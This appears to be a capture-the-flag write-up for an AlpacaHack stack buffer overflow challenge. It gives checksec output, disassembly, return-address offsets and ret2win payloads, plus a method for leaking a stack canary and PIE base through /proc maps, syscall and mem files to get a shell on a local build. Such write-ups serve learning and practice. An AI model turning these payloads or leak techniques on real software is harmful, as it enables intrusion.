# Link
https://alpacahack.com/challenges/before-write

# checksec
root@b2f149cb4206:~/CTF/alpacahack/before-write# checksec chall 
[*] '/root/CTF/alpacahack/before-write/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

# suspicious
```
char buf[0x20] = {};//32
...
read(STDIN_FILENO, buf, sizeof(buf)*0x20); <- 32*32=1024? 
```

# check getval

## WRONG!! 
```
g++ -g main.c <-------- this is different from chall!!!!!
gdb a.out
b getval(char const*)
r
gdb-peda$ p/d (char *)($rbp)-&buf[0]
-> 48 or 56 <-------- this is different from chall!!!!!
```

## correct
```
$ objdump -d chall | sed -n '/<getval>/,/^$/p'

4011f8:  sub    $0x30,%rsp          # allocate 48 bytes
4011fc:  mov    %rdi,-0x28(%rbp)    # msg param at rbp-0x28
401200:  movq   $0x0,-0x20(%rbp)    # buf[0..7]  <--- offset is 0x20 = 32 !
401208:  movq   $0x0,-0x18(%rbp)    # buf[8..15]
401210:  movq   $0x0,-0x10(%rbp)    # buf[16..23]
401218:  movq   $0x0,-0x8(%rbp)     # buf[24..31]
...
401240:  lea    -0x20(%rbp),%rax    # ← destination of read()
401244:  mov    $0x400,%edx         #    count = 0x400
401251:  call   read
```

return address = $rbp+8: 32+8=40

payload = b'A' * 40 + pwn.p64(win)

# solve.py note
- `res = io.recvall()` hangs forever after win() spawns /bin/sh
  (shell keeps stdout open → no EOF). Use `io.interactive()` instead.
- Verified remote: 34.170.146.252:31964 → RTACTF{sizeof_is_a_bit_c0nfus1ng}

---

# Exploit summary: a.out (local g++ build)

`g++ -g main.c` ≠ `chall`. Extra defenses:

| | chall | a.out |
|--|--|--|
| PIE | No | **Yes** |
| Canary | No | **Yes** |
| win symbol | `win` | `_Z3winv` (C++) |
| buf @ | rbp-0x20 | rbp-0x30 |

## Stack layout (a.out / getval)

```
buf          @ rbp-0x30   (lea -0x30(%rbp) → read dest)
msg param    @ rbp-0x38
canary       @ rbp-0x8
saved rbp    @ rbp+0
saved rip    @ rbp+8
```

- buf → canary: **40**
- buf → saved rip: **56**  (matches GDB `p/d $rbp-&buf[0]` = 48 + 8)

## Payload

```
b'A'*40 + p64(canary) + b'B'*8 + p64(base + 0x11e9)
```

`0x11e9` = offset of `_Z3winv` from PIE base.

## How to leak while blocked in read()

Process blocks in `read()` after printing `value: `. Before sending:

1. **PIE base** — first `/proc/<pid>/maps` line containing `a.out`
   ```
   base = int(line.split('-')[0], 16)
   ```

2. **buf address** — `/proc/<pid>/syscall` (read args; rsi = buf)
   ```
   format: nr a0 a1 a2 a3 a4 a5 sp pc
   buf = int(fields[2], 16)
   ```

3. **canary** — read `/proc/<pid>/mem` at `buf + 0x30 - 8` (= rbp-8)

## Verified

Local shell as uid=1000 after:
```
payload  = b'A' * 40
payload += p64(canary)
payload += b'B' * 8
payload += p64(base + 0x11e9)
io.send(payload)
```